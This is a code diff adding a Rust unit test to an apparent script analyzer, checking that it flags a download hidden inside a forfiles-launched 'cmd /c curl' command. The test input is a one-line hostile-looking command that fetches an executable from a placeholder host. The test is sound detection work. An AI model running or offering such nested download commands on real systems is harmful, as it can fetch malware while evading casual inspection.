@@ -6769,6 +6769,25 @@ mod child_tests {
             report.traits
         );
     }
+
+    #[test]
+    fn forfiles_c_nested_cmd_surfaces_download_trait() {
+        let script =
+            br#"forfiles /m *.txt /c "cmd /c curl -o out.exe https://forfiles.example/p.exe""#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://forfiles.example/p.exe"
+                            && dst.as_deref() == Some("out.exe")
+                )
+            }),
+            "nested forfiles curl download not surfaced: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
